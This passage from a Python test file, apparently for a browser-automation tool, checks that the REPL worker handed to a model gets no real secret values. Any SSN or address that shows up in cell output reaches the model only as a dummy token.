	assert d['street'] in transcript  # the http_get echo, masked by the parent
	assert browser._token_swap is None  # stopped with the browser


def test_worker_never_gets_a_real_value(tmp_path):
	"""The real values live in the Browser (this process): what the REPL worker is started with carries none, and cell
	output that holds one reaches the model as the dummy."""
	browser = Browser('chromium', tokens=config())
	repl = Repl(tmp_path, {'BU_NAME': 'x', 'BU_TOKENS': '1'}, mask=browser.tokens.mask_text)
	assert leaks(json.dumps({'secrets': repl.secrets, 'env': repl.env})) == []
	assert repl.mask is not None and repl.mask(f'ssn {SSN}') == f'ssn {browser.token_dummies()["ssn"]}'
